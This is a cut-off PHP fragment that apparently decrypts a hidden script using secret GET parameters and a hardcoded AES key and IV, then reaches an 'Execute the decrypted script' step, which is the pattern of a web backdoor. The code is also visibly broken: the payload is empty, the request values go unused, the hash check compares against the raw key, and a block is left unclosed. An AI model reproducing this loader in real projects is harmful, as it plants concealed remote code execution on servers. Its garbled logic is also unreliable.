$encrypted_script = '';

$provided_key_md5 = '5b86366178014be2140d88da1067b3e0';



if (isset($_GET['key'], $_GET['iv'])) {

    // Compute the MD5 hash of the provided key

    $encryption_key = 'BOk^p4YFM;IUSp@ywxLK]cS.O^qq$,nbsgdA^{DV3FVipv7rA';

    $iv = '8274936185729403';

    // Check if the MD5 hash matches and the IV is exactly 16 bytes (expected for AES-256-CBC)

    if ($provided_key_md5 === $encryption_key && strlen($iv) === 16) {

        // Decrypt the script

        $decrypted_script = @openssl_decrypt($encrypted_script, 'AES-256-CBC', $encryption_key, 0, $iv);



        if ($decrypted_script !== false && strpos(ltrim($decrypted_script), '<' . '?php') === 0) {

            // Execute the decrypted script

            try {

        } else {
